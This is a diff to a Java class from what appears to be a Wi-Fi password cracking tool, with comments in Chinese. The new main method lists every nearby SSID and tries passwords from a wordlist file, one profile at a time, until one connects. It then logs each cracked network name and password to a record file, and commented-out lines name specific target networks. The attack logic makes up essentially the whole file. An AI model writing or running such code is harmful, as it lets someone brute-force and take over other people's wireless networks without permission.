@@ -1,10 +1,7 @@
 package io.github.weechang;
 
 import io.github.weechang.cmd.WlanExecute;
-import io.github.weechang.config.FileConfig;
-import io.github.weechang.config.Generetor;
-import io.github.weechang.generetor.PasswordGeneretor;
-import io.github.weechang.generetor.ProfileGeneretor;
+import io.github.weechang.generator.ProfileGenerator;
 import io.github.weechang.util.FileUtils;
 
 import java.util.List;
@@ -15,38 +12,60 @@ import java.util.List;
 public class Connector {
 
     /**
-     * 生成密码
+     * 密码路径
      */
-    public static void genPassword(Generetor generetor) {
-        PasswordGeneretor.genPassword(generetor);
-    }
+    public static final String PASSWORD_PATH = "D:\\wlan\\password\\wake1.txt";
+
+    /**
+     * 配置文件暂时存放路径
+     */
+    public static final String PROFILE_TEMP_PATH = "D:\\wlan\\profile";
+
+    /**
+     * 破解成功wifi存放路径
+     */
+    public static final String RESULT_PATH = "D:\\wlan\\record.txt";
+
+    /**
+     * 日志存放路径
+     */
+    public static final String LOG_PATH = "D:\\wlan\\log.txt";
+
+    /**
+     * 批处理密码数量
+     */
+    public static final int BATH_SIZE = 1000;
+
+    /**
+     * 要ping的域名
+     */
+    public static final String PING_DOMAIN = "www.baidu.com";
 
     /**
      * 生成配置文件
      */
-    public static void genProfile(String ssid, Generetor generetor) {
-        ProfileGeneretor profileGeneretor = new ProfileGeneretor(ssid, generetor);
-        profileGeneretor.genProfile();
+    public static void genProfile(String ssid) {
+        ProfileGenerator profileGenerator = new ProfileGenerator(ssid, PASSWORD_PATH);
+        profileGenerator.genProfile();
     }
 
     /**
      * 根据密码验证配置文件
      */
-    public static String check(String ssid, Generetor generetor) {
+    public static String check(String ssid) {
         String password = null;
         List<String> passwordList = null;
         int counter = 0;
         outer:
         while (true) {
-            int start = counter * FileConfig.PASSWORD_SIZE;
-            int end = (counter + 1) * FileConfig.PASSWORD_SIZE - 1;
-            passwordList = PasswordGeneretor.getPassword(generetor, start, end);
+            int start = counter * BATH_SIZE;
+            int end = (counter + 1) * BATH_SIZE - 1;
+            passwordList = FileUtils.readLine(PASSWORD_PATH, start, end);
             if (passwordList != null && passwordList.size() > 0) {
-                for (int i = 0; i < passwordList.size(); i++) {
-                    String profileName = passwordList.get(i) + ".xml";
-                    boolean checked = WlanExecute.check(ssid, profileName);
+                for (String item : passwordList) {
+                    boolean checked = WlanExecute.check(ssid, item);
                     if (checked) {
-                        password = passwordList.get(i);
+                        password = item;
                         break outer;
                     }
                 }
@@ -62,40 +81,39 @@ public class Connector {
     /**
      * 整体步骤如下：
      * <p>
-     * -- step1. 批量生成密码
+     * -- step1. 扫所有可用的，信号较好的WIFI
      * -- step2. 根据密码批量生成配置文件
      * -- step3. 根据密码一个一个配置文件验证，直到找到正确的密码
      */
     public static void main(String[] args) {
-        long start = System.currentTimeMillis();
-        Generetor generetor = Generetor.WAKE;
-//        Generetor generetor = Generetor.MOST_USE;
-//        Generetor generetor = Generetor.FIRST_MOST_COUPLE;
-
-
-        String ssid = "Tenda_2E85A8";
-//        String ssid= "HUAWEI_P9_ZW";
-//        String ssid = "TP-LINK_5410";
-//        String ssid = "ChinaNet-WWS2";
-
         // step1
-//        genPassword(generetor);
-        // step2
-        genProfile(ssid, generetor);
-        // step3
-        String password = check(ssid, generetor);
+        List<String> ssidList = WlanExecute.listSsid();
 
-        long end = System.currentTimeMillis();
-        System.out.println("耗时：" + (end - start) / 1000 + "秒");
-        if (password != null) {
-            System.out.println("无线网络破解成功，密码：" + password);
-            String record = "ssid:" + ssid + ",password:" + password;
-            FileUtils.appendToFile("D:\\wlan\\record.txt" ,record);
-        } else {
-            System.out.println("无线网络破解失败");
+//        ssidList.clear();
+//        ssidList.add("Tenda_2E85A8");
+//        ssidList.add("HUAWEI_P9_ZW");
+//        ssidList.add("TP-LINK_5410");
+//        ssidList.add("ChinaNet-WWS2");
+
+        if (ssidList != null && ssidList.size() > 0) {
+            for (String ssid : ssidList) {
+                long start = System.currentTimeMillis();
+                // step2
+                genProfile(ssid);
+                // step3
+                String password = check(ssid);
+
+                long end = System.currentTimeMillis();
+                System.out.println("耗时：" + (end - start) / 1000 + "秒");
+                if (password != null) {
+                    System.out.println("无线网络破解成功，密码：" + password);
+                    String record = "ssid:" + ssid + ",password:" + password;
+                    FileUtils.appendToFile(RESULT_PATH, record);
+                } else {
+                    System.out.println("无线网络破解失败");
+                }
+            }
         }
-
     }
-
 
 }
